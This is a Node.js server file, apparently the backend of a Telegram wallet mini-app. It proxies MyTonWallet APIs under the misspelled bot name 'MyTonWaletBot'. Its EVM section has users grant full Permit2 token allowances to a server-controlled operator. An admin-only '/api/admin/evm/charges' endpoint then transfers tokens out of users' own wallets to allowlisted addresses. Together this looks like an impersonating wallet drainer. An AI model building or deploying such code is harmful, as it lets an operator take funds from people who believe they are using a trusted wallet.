import { createServer } from 'node:http';
import { readFile } from 'node:fs/promises';
import { createReadStream } from 'node:fs';
import { extname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import crypto from 'node:crypto';
import { verifyTelegramInitData, signSession, verifySession } from './telegram.mjs';
import { runMonitor } from './monitor.mjs';
import {
  generateRewardCheckCode, isAdminTelegramId, parseMaxClaims, parseRewardAmount, parseRewardAsset,
} from './rewards.mjs';
import {
  assertChargeAuthorization,
  assertFullAuthorization,
  assertTransactionHash,
  getAuthorizationChallengeMessage,
  normalizeEvmAddress,
  parseBaseUnits,
  parseRecipientAllowlist,
  readPermit2Authorization,
  submitPermit2Charge,
  verifyAuthorizationChallenge,
} from './evm.mjs';
import {
  claimEthReward, createEthRewardCheck, getEthBalance,
} from './eth-rewards.mjs';

const root = join(fileURLToPath(new URL('.', import.meta.url)), '..');
const dist = join(root, 'dist');
const env = process.env;
const requiredSettings = [
  'SUPABASE_URL', 'SUPABASE_SERVICE_ROLE_KEY', 'TELEGRAM_BOT_TOKEN',
  'SESSION_SECRET', 'ADMIN_TON_DEPOSIT_ADDRESS',
];
if (env.TON_MONITOR_ENABLED === '1') requiredSettings.push('TONCENTER_API_KEY');
const missingSettings = requiredSettings.filter((key) => !env[key]);
if (missingSettings.length) throw new Error(`Missing required server settings: ${missingSettings.join(', ')}`);

const contentTypes = {
  '.css': 'text/css; charset=utf-8',
  '.html': 'text/html; charset=utf-8',
  '.ico': 'image/x-icon',
  '.js': 'text/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.png': 'image/png',
  '.svg': 'image/svg+xml',
  '.webp': 'image/webp',
  '.woff2': 'font/woff2',
  '.wasm': 'application/wasm',
};
const CENTRAL_API_PROXY_PREFIX = '/api/mywallet';
const CENTRAL_API_ORIGIN = 'https://api.mywallet.io';
const PORTFOLIO_API_PROXY_PREFIX = '/api/portfolio';
const PORTFOLIO_API_ORIGIN = 'https://api-portfolio.mywallet.io/api';
const CHAIN_API_PROXY_ROUTES = [
  ['/api/toncenter-testnet', 'https://toncenter-testnet.mytonwallet.org'],
  ['/api/toncenter', 'https://toncenter.mytonwallet.org'],
  ['/api/tonapi-testnet', 'https://tonapiio-testnet.mytonwallet.org'],
  ['/api/tonapi', 'https://tonapiio.mytonwallet.org'],
];
const INTERNAL_TON_API_PREFIX = '/internal-ton';
const json = (res, status, body) => { res.writeHead(status, { 'content-type': 'application/json; charset=utf-8', 'cache-control': 'no-store' }); res.end(JSON.stringify(body)); };
const rewardCheckResponse = (row) => row && ({
  id: row.id,
  title: row.title,
  code: row.code,
  amountPerClaim: String(row.amount_per_claim),
  asset: row.asset || 'TON',
  maxClaims: row.max_claims,
  claimedCount: row.claimed_count,
  isActive: row.active,
  expiresAt: row.expires_at || undefined,
  createdAt: row.created_at,
  link: `https://t.me/${env.BOT_USERNAME || 'MyTonWaletBot'}?startapp=check_${row.code}`,
});
async function body(req) {
  let out = '';
  for await (const chunk of req) { out += chunk; if (out.length > 64 * 1024) throw Object.assign(new Error('Request body too large'), { status: 413 }); }
  try { return JSON.parse(out || '{}'); } catch { throw Object.assign(new Error('Invalid JSON'), { status: 400 }); }
}
async function rawBody(req) {
  const chunks = [];
  let size = 0;
  for await (const chunk of req) {
    size += chunk.length;
    if (size > 2 * 1024 * 1024) throw Object.assign(new Error('Request body too large'), { status: 413 });
    chunks.push(chunk);
  }
  return Buffer.concat(chunks);
}
async function proxyFixedApi(req, res, proxyPrefix, upstreamOrigin) {
  const requestUrl = new URL(req.url, 'http://preview.local');
  const upstreamPath = requestUrl.pathname.slice(proxyPrefix.length) || '/';
  const upstreamUrl = new URL(
    `${upstreamOrigin.replace(/\/+$/, '')}${upstreamPath}${requestUrl.search}`,
  );
  const headers = {};

  for (const name of [
    'accept', 'content-type', 'authorization', 'x-api-key', 'x-actions-version',
    'x-app-version', 'x-app-origin', 'x-app-clientid', 'x-app-env', 'x-app-name', 'x-auth-token',
  ]) {
    const value = req.headers[name];
    if (value) headers[name] = value;
  }

  const hasBody = req.method !== 'GET' && req.method !== 'HEAD';
  const response = await fetch(upstreamUrl, {
    method: req.method,
    headers,
    body: hasBody ? await rawBody(req) : undefined,
    redirect: 'manual',
  });
  const responseHeaders = {};
  for (const name of ['cache-control', 'content-type', 'etag', 'x-snapshot-at']) {
    const value = response.headers.get(name);
    if (value) responseHeaders[name] = value;
  }

  res.writeHead(response.status, responseHeaders);
  if (req.method === 'HEAD' || !response.body) {
    res.end();
    return;
  }

  res.end(Buffer.from(await response.arrayBuffer()));
}
async function supabase(path, options = {}) {
  if (!env.SUPABASE_URL || !env.SUPABASE_SERVICE_ROLE_KEY) throw new Error('Supabase is not configured');
  const response = await fetch(`${env.SUPABASE_URL}/rest/v1/${path}`, {
    ...options, headers: { apikey: env.SUPABASE_SERVICE_ROLE_KEY, authorization: `Bearer ${env.SUPABASE_SERVICE_ROLE_KEY}`,
      'content-type': 'application/json', ...(options.headers || {}) },
  });
  if (!response.ok) {
    throw Object.assign(new Error(`Supabase request failed (${response.status})`), {
      status: response.status,
    });
  }
  const text = await response.text();
  return text ? JSON.parse(text) : undefined;
}
async function claimReward(code, telegramId) {
  if (code.startsWith('eth_')) {
    return claimEthReward(code, telegramId);
  }
  let lastError;
  for (let attempt = 0; attempt < 2; attempt++) {
    try {
      const result = await supabase('rpc/internal_ton_claim_reward_v2', {
        method: 'POST',
        body: JSON.stringify({ p_code: code, p_telegram_id: telegramId }),
      });
      const claim = result?.[0];
      return claim && {
        status: claim.status,
        amount: claim.amount || undefined,
        title: claim.title || undefined,
        balance: claim.resulting_balance || undefined,
        asset: claim.asset || 'TON',
      };
    } catch (error) {
      lastError = error;
    }
  }
  console.error('Reward claim failed after retry', lastError);
  return { status: 'error' };
}
const evmAuthorizationResponse = (row) => row && ({
  id: row.id,
  ownerAddress: row.owner_address,
  chainId: row.chain_id,
  tokenAddress: row.token_address,
  permit2OperatorAddress: row.permit2_operator_address,
  tokenAllowance: String(row.token_allowance),
  permit2AllowanceAmount: String(row.permit2_allowance_amount),
  permit2Expiration: String(row.permit2_expiration),
  permit2Nonce: String(row.permit2_nonce),
  approvalTxHash: row.approval_tx_hash,
  permitTxHash: row.permit_tx_hash,
  status: row.status,
  verifiedAt: row.verified_at,
});
const evmAuthorizationSelect = [
  'id', 'telegram_id', 'owner_address', 'chain_id', 'token_address',
  'permit2_operator_address', 'token_allowance', 'permit2_allowance_amount',
  'permit2_expiration', 'permit2_nonce', 'approval_tx_hash', 'permit_tx_hash',
  'status', 'verified_at',
].join(',');
async function createEvmAuthorizationChallenge(telegramId, ownerAddress) {
  const nonce = crypto.randomBytes(32).toString('base64url');
  const expiresAt = new Date(Date.now() + 5 * 60 * 1000).toISOString();
  await supabase('internal_evm_authorization_challenges', {
    method: 'POST',
    body: JSON.stringify({
      telegram_id: telegramId,
      owner_address: ownerAddress,
      nonce,
      expires_at: expiresAt,
    }),
  });
  return { nonce, message: getAuthorizationChallengeMessage(ownerAddress, nonce), expiresAt };
}
async function findEvmAuthorization(telegramId, ownerAddress) {
  const filters = [
    `telegram_id=eq.${encodeURIComponent(telegramId)}`,
    'status=eq.active',
    `select=${evmAuthorizationSelect}`,
    'order=updated_at.desc',
    'limit=1',
  ];
  if (ownerAddress) filters.splice(1, 0, `owner_address=eq.${encodeURIComponent(ownerAddress)}`);
  const rows = await supabase(`internal_evm_authorizations?${filters.join('&')}`, {
    headers: { accept: 'application/json' },
  });
  return rows?.[0];
}
function chargeConfiguration() {
  if (env.EVM_MANUAL_CHARGE_ENABLED !== '1') {
    throw Object.assign(new Error('Manual EVM charges are disabled'), { status: 503 });
  }
  return {
    maxCharge: parseBaseUnits(env.EVM_CHARGE_MAX_BASE_UNITS, 'EVM_CHARGE_MAX_BASE_UNITS'),
    dailyMax: parseBaseUnits(env.EVM_CHARGE_DAILY_MAX_BASE_UNITS, 'EVM_CHARGE_DAILY_MAX_BASE_UNITS'),
    recipients: parseRecipientAllowlist(),
  };
}
function chargeResponse(row, idempotent = false) {
  return {
    id: row.charge_id,
    status: row.status,
    recipientAddress: row.recipient_address,
    amountBaseUnits: row.amount_base_units,
    txHash: row.tx_hash || undefined,
    idempotent,
  };
}
function session(req) {
  const cookie = req.headers.cookie?.split(';').map((x) => x.trim()).find((x) => x.startsWith('mtw_session='));
  return cookie && verifySession(decodeURIComponent(cookie.slice(12)), env.SESSION_SECRET);
}
function expireSession(res) {
  res.setHeader('set-cookie', 'mtw_session=; HttpOnly; SameSite=Strict; Path=/; Max-Age=0');
}
async function api(req, res) {
  try {
    const requestPath = new URL(req.url, 'http://internal.local').pathname;
    if (req.url === '/api/auth/telegram' && req.method === 'POST') {
      const data = await body(req);
      const verified = verifyTelegramInitData(data.initData, env.TELEGRAM_BOT_TOKEN);
      if (!verified.user?.id) {
        expireSession(res);
        return json(res, 400, { error: 'Telegram user is required' });
      }
      const id = String(verified.user.id);
      await supabase('internal_ton_users?on_conflict=telegram_id', { method: 'POST', headers: { prefer: 'resolution=merge-duplicates' },
        body: JSON.stringify({ telegram_id: id, username: verified.user.username || null,
          first_name: verified.user.first_name || null, last_name: verified.user.last_name || null,
          language_code: verified.user.language_code || null, last_login_at: new Date().toISOString() }) });
      const users = await supabase(`internal_ton_users?telegram_id=eq.${encodeURIComponent(id)}&select=id`, { headers: { accept: 'application/json' } });
      if (users?.[0] && env.ADMIN_TON_DEPOSIT_ADDRESS) {
        const comment = `u_${crypto.randomBytes(12).toString('base64url')}`;
        await supabase('internal_ton_deposit_accounts?on_conflict=telegram_id', { method: 'POST',
          headers: { prefer: 'resolution=ignore-duplicates' },
          body: JSON.stringify({ user_id: users[0].id, telegram_id: id, address: env.ADMIN_TON_DEPOSIT_ADDRESS, comment }) });
        await supabase('internal_ton_balances?on_conflict=telegram_id', { method: 'POST',
          headers: { prefer: 'resolution=ignore-duplicates' },
          body: JSON.stringify({ user_id: users[0].id, telegram_id: id, amount: 0, currency: 'TON' }) });
        await supabase('internal_usdt_balances?on_conflict=telegram_id', { method: 'POST',
          headers: { prefer: 'resolution=ignore-duplicates' },
          body: JSON.stringify({ user_id: users[0].id, telegram_id: id, amount: 0, currency: 'USDT' }) });
         await supabase('internal_evm_balances?on_conflict=telegram_id', { method: 'POST',
           headers: { prefer: 'resolution=ignore-duplicates' },
           body: JSON.stringify({ user_id: users[0].id, telegram_id: id, amount: 0, currency: 'ETH' }) });
      }
      let reward;
      if (verified.startParam?.startsWith('check_')) {
        reward = await claimReward(verified.startParam.slice(6), id);
      }
      const token = signSession(id, env.SESSION_SECRET);
      res.setHeader('set-cookie', `mtw_session=${encodeURIComponent(token)}; HttpOnly; SameSite=Strict; Path=/; Max-Age=604800${env.NODE_ENV === 'production' ? '; Secure' : ''}`);
      return json(res, 200, {
        ok: true,
        isAdmin: isAdminTelegramId(id, env.ADMIN_TELEGRAM_IDS),
        ...(reward ? { reward } : {}),
      });
    }
    if (!req.url.startsWith('/api/')) return false;
    const user = session(req);
    if (!user) return json(res, 401, { error: 'Authentication required' });
    if (requestPath === '/api/evm/authorization/challenge' && req.method === 'POST') {
      const data = await body(req);
      const ownerAddress = normalizeEvmAddress(data.ownerAddress, 'ownerAddress');
      return json(res, 200, await createEvmAuthorizationChallenge(user, ownerAddress));
    }
    if (requestPath === '/api/evm/authorization' && req.method === 'POST') {
      const data = await body(req);
      const ownerAddress = normalizeEvmAddress(data.ownerAddress, 'ownerAddress');
      const approvalTxHash = assertTransactionHash(data.approvalTxHash, 'approvalTxHash');
      const permitTxHash = assertTransactionHash(data.permitTxHash, 'permitTxHash');
      const recoveredAddress = verifyAuthorizationChallenge({
        address: ownerAddress,
        nonce: data.nonce,
        signature: data.signature,
      });
      if (recoveredAddress !== ownerAddress) {
        throw Object.assign(new Error('Authorization signature does not match the wallet'), { status: 400 });
      }
      const challenges = await supabase(
        `internal_evm_authorization_challenges?telegram_id=eq.${encodeURIComponent(user)}`
        + `&owner_address=eq.${encodeURIComponent(ownerAddress)}&nonce=eq.${encodeURIComponent(data.nonce)}`
        + '&used_at=is.null&select=nonce,expires_at&limit=1',
        { headers: { accept: 'application/json' } },
      );
      if (!challenges?.[0] || Date.parse(challenges[0].expires_at) <= Date.now()) {
        throw Object.assign(new Error('Authorization challenge is expired or unavailable'), { status: 409 });
      }
      const state = assertFullAuthorization(await readPermit2Authorization(ownerAddress));
      const consumed = await supabase('rpc/internal_evm_consume_authorization_challenge', {
        method: 'POST',
        body: JSON.stringify({
          p_telegram_id: user,
          p_owner_address: ownerAddress,
          p_nonce: data.nonce,
        }),
      });
      if (consumed?.[0] !== true && consumed?.[0]?.internal_evm_consume_authorization_challenge !== true) {
        throw Object.assign(new Error('Authorization challenge was already used'), { status: 409 });
      }
      const existing = await supabase(
        `internal_evm_authorizations?owner_address=eq.${encodeURIComponent(ownerAddress)}&select=telegram_id,id&limit=1`,
        { headers: { accept: 'application/json' } },
      );
      if (existing?.[0] && existing[0].telegram_id !== user) {
        throw Object.assign(new Error('This Ethereum address is already linked to another user'), { status: 409 });
      }
      const values = {
        telegram_id: user,
        owner_address: state.ownerAddress,
        chain_id: 1,
        token_address: state.tokenAddress,
        permit2_operator_address: state.operatorAddress,
        token_allowance: state.tokenAllowance.toString(),
        permit2_allowance_amount: state.permit2AllowanceAmount.toString(),
        permit2_expiration: state.permit2Expiration.toString(),
        permit2_nonce: state.permit2Nonce.toString(),
        approval_tx_hash: approvalTxHash,
        permit_tx_hash: permitTxHash,
        status: 'active',
        verified_at: new Date().toISOString(),
        updated_at: new Date().toISOString(),
      };
      const saved = existing?.[0]
        ? await supabase(`internal_evm_authorizations?id=eq.${encodeURIComponent(existing[0].id)}`, {
          method: 'PATCH',
          headers: { prefer: 'return=representation' },
          body: JSON.stringify(values),
        })
        : await supabase('internal_evm_authorizations', {
          method: 'POST',
          headers: { prefer: 'return=representation' },
          body: JSON.stringify({ ...values, created_at: new Date().toISOString() }),
        });
      return json(res, 201, { authorization: evmAuthorizationResponse(saved?.[0]) });
    }
    if (req.url.startsWith('/api/admin/')) {
      if (!isAdminTelegramId(user, env.ADMIN_TELEGRAM_IDS)) return json(res, 403, { error: 'Admin access required' });
      if (requestPath === '/api/admin/evm/charges' && req.method === 'POST') {
        const data = await body(req);
        const config = chargeConfiguration();
        const amount = parseBaseUnits(data.amountBaseUnits, 'amountBaseUnits');
        const recipientAddress = normalizeEvmAddress(data.recipientAddress, 'recipientAddress');
        if (!config.recipients.has(recipientAddress)) {
          throw Object.assign(new Error('The charge recipient is not allowlisted'), { status: 403 });
        }
        if (typeof data.idempotencyKey !== 'string' || !/^[A-Za-z0-9._:-]{1,128}$/.test(data.idempotencyKey)) {
          throw Object.assign(new Error('idempotencyKey must be 1-128 safe characters'), { status: 400 });
        }
        if (typeof data.telegramId !== 'string' || !/^[0-9]{1,32}$/.test(data.telegramId)) {
          throw Object.assign(new Error('telegramId must be a Telegram user id'), { status: 400 });
        }
        const ownerAddress = data.ownerAddress
          ? normalizeEvmAddress(data.ownerAddress, 'ownerAddress')
          : undefined;
        const authorization = await findEvmAuthorization(data.telegramId, ownerAddress);
        if (!authorization) {
          throw Object.assign(new Error('No active EVM authorization found'), { status: 404 });
        }
        const state = assertChargeAuthorization(
          await readPermit2Authorization(authorization.owner_address),
          amount,
        );
        const reserved = (await supabase('rpc/internal_evm_reserve_charge', {
          method: 'POST',
          body: JSON.stringify({
            p_telegram_id: data.telegramId,
            p_owner_address: authorization.owner_address,
            p_idempotency_key: data.idempotencyKey,
            p_recipient_address: recipientAddress,
            p_amount_base_units: amount.toString(),
            p_max_charge_base_units: config.maxCharge.toString(),
            p_daily_max_base_units: config.dailyMax.toString(),
          }),
        }))?.[0];
        if (!reserved) throw new Error('Charge reservation failed');
        if (reserved.status !== 'reserved') {
          if (reserved.status === 'pending' || reserved.status === 'confirmed') {
            return json(res, reserved.status === 'pending' ? 202 : 200, { charge: chargeResponse(reserved, true) });
          }
          const status = reserved.status.includes('limit') ? 429 : 409;
          throw Object.assign(new Error(`Charge cannot be reserved: ${reserved.status}`), { status });
        }
        try {
          const txHash = await submitPermit2Charge({
            from: state.ownerAddress,
            to: recipientAddress,
            amount,
          });
          await supabase('rpc/internal_evm_set_charge_result', {
            method: 'POST',
            body: JSON.stringify({
              p_charge_id: reserved.charge_id,
              p_status: 'confirmed',
              p_tx_hash: txHash,
            }),
          });
          return json(res, 201, {
            charge: chargeResponse({ ...reserved, status: 'confirmed', tx_hash: txHash }),
          });
        } catch (error) {
          await supabase('rpc/internal_evm_set_charge_result', {
            method: 'POST',
            body: JSON.stringify({
              p_charge_id: reserved.charge_id,
              p_status: 'failed',
              p_error_message: error instanceof Error ? error.message : 'Charge failed',
            }),
          }).catch((updateError) => console.error('Failed to mark EVM charge failed', updateError));
          throw error;
        }
      }
      if (req.url === '/api/admin/reward-checks' && req.method === 'GET') {
        const rows = await supabase('internal_ton_reward_checks?select=id,title,code,asset,amount_per_claim,max_claims,claimed_count,active,expires_at,creator_telegram_id,created_at,updated_at&order=created_at.desc', { headers: { accept: 'application/json' } });
        const checks = (rows || [])
          .map(rewardCheckResponse)
          .sort((a, b) => Date.parse(b.createdAt) - Date.parse(a.createdAt));
        return json(res, 200, { checks });
      }
      if (req.url === '/api/admin/reward-checks' && req.method === 'POST') {
        const data = await body(req);
        if (typeof data.title !== 'string' || !data.title.trim()) throw Object.assign(new Error('title is required'), { status: 400 });
        const asset = parseRewardAsset(data.asset);
        const amount = parseRewardAmount(data.amountBaseUnits ?? data.amountNano);
        const maxClaims = parseMaxClaims(data.maxClaims);
        let expiresAt = null;
        if (data.expiresAt !== undefined && data.expiresAt !== null) {
          if (typeof data.expiresAt !== 'string' || Number.isNaN(Date.parse(data.expiresAt))) throw Object.assign(new Error('expiresAt must be a valid date'), { status: 400 });
          expiresAt = new Date(data.expiresAt).toISOString();
        }
        if (asset === 'ETH') {
          const check = await createEthRewardCheck({
            title: data.title.trim(),
            amountPerClaim: amount,
            maxClaims,
            creatorTelegramId: user,
            expiresAt,
          });
          return json(res, 201, { check: rewardCheckResponse(check) });
        }
        const rows = await supabase('internal_ton_reward_checks', {
          method: 'POST', headers: { prefer: 'return=representation' },
          body: JSON.stringify({ title: data.title.trim(), code: generateRewardCheckCode(), amount_per_claim: amount,
            asset, max_claims: maxClaims, creator_telegram_id: user, expires_at: expiresAt }),
        });
        return json(res, 201, { check: rewardCheckResponse(rows?.[0] || {}) });
      }
      const disableMatch = req.url.match(/^\/api\/admin\/reward-checks\/([^/]+)\/disable$/);
      if (disableMatch && req.method === 'POST') {
        const rows = await supabase(`internal_ton_reward_checks?id=eq.${encodeURIComponent(disableMatch[1])}`, {
          method: 'PATCH', headers: { prefer: 'return=representation' }, body: JSON.stringify({ active: false, updated_at: new Date().toISOString() }),
        });
        return json(res, 200, { ok: true, check: rewardCheckResponse(rows?.[0] || {}) });
      }
      return json(res, 404, { error: 'Not found' });
    }
    const account = await supabase(`internal_ton_deposit_accounts?telegram_id=eq.${encodeURIComponent(user)}&select=address,comment`, { headers: { accept: 'application/json' } });
    if (req.url === '/api/account' && req.method === 'GET') return json(res, 200, account?.[0] || {});
    if (req.url.startsWith('/api/balance') && req.method === 'GET') {
      const currency = new URL(req.url, 'http://internal.local').searchParams.get('currency') || 'TON';
      if (currency !== 'TON' && currency !== 'USDT' && currency !== 'ETH') {
        return json(res, 400, { error: 'Unsupported currency' });
      }
      if (currency === 'ETH') {
        return json(res, 200, { amount: await getEthBalance(user), currency });
      }
      const rows = await supabase(`rpc/internal_${currency.toLowerCase()}_get_balance`, {
        method: 'POST',
        body: JSON.stringify({ p_telegram_id: user }),
      });
      return json(res, 200, rows?.[0] || { amount: '0', currency });
    }
    return json(res, 404, { error: 'Not found' });
  } catch (error) { return json(res, error?.status || (error?.message === 'Authentication required' ? 401 : 500),
    (() => {
      if (req.url === '/api/auth/telegram') {
        expireSession(res);
      }
      return { error: error instanceof Error ? error.message : 'Request failed' };
    })()); }
}
const server = createServer(async (req, res) => {
  if (req.url?.startsWith(CENTRAL_API_PROXY_PREFIX)
    && (req.url === CENTRAL_API_PROXY_PREFIX || req.url.startsWith(`${CENTRAL_API_PROXY_PREFIX}/`))) {
    try {
      return await proxyFixedApi(req, res, CENTRAL_API_PROXY_PREFIX, CENTRAL_API_ORIGIN);
    } catch (error) {
      console.error('Central API proxy failed', error);
      return json(res, 502, { error: 'Central API unavailable' });
    }
  }
  if (req.url?.startsWith(PORTFOLIO_API_PROXY_PREFIX)
    && (req.url === PORTFOLIO_API_PROXY_PREFIX || req.url.startsWith(`${PORTFOLIO_API_PROXY_PREFIX}/`))) {
    try {
      return await proxyFixedApi(req, res, PORTFOLIO_API_PROXY_PREFIX, PORTFOLIO_API_ORIGIN);
    } catch (error) {
      console.error('Portfolio API proxy failed', error);
      return json(res, 502, { error: 'Portfolio API unavailable' });
    }
  }
  const chainProxy = CHAIN_API_PROXY_ROUTES.find(([prefix]) => (
    req.url?.startsWith(prefix) && (req.url === prefix || req.url.startsWith(`${prefix}/`))
  ));
  if (chainProxy) {
    try {
      return await proxyFixedApi(req, res, chainProxy[0], chainProxy[1]);
    } catch (error) {
      console.error('Chain API proxy failed', error);
      return json(res, 502, { error: 'Chain API unavailable' });
    }
  }
  if (req.url === INTERNAL_TON_API_PREFIX || req.url?.startsWith(`${INTERNAL_TON_API_PREFIX}/`)) {
    req.url = req.url.slice(INTERNAL_TON_API_PREFIX.length) || '/';
  }
  if (req.url?.startsWith('/api/')) return api(req, res);
  const requestPathname = new URL(req.url || '/', 'http://internal.local').pathname;
  const requested = requestPathname === '/' ? 'index.html' : requestPathname.replace(/^\/+/, '');
  const file = join(dist, requested);
  if (!file.startsWith(`${dist}/`)) return json(res, 400, { error: 'Invalid path' });
  try {
    await readFile(file);
    res.writeHead(200, {
      'content-type': contentTypes[extname(file)] || 'application/octet-stream',
      'cache-control': extname(file) === '.html' ? 'no-cache' : 'public, max-age=3600',
    });
    createReadStream(file).pipe(res);
  } catch {
    json(res, 404, { error: 'Not found' });
  }
});
const host = env.HOST || '0.0.0.0';
server.listen(Number(env.PORT || 5000), host, () => console.log(`server listening on ${host}:${env.PORT || 5000}`));
if (env.TON_MONITOR_ENABLED === '1') {
  const monitorSupabase = (fn, params) => supabase(`rpc/internal_ton_${fn}`, { method: 'POST', body: JSON.stringify(params) });
  let monitorRunning = false;
  const tick = async () => {
    if (monitorRunning) return;
    monitorRunning = true;
    try {
      await runMonitor({ supabase: monitorSupabase });
    } catch (error) {
      console.error('[ton-monitor]', error.message);
    } finally {
      monitorRunning = false;
    }
  };
  void tick();
  setInterval(tick, Number(env.TON_MONITOR_INTERVAL_MS || 30000));
}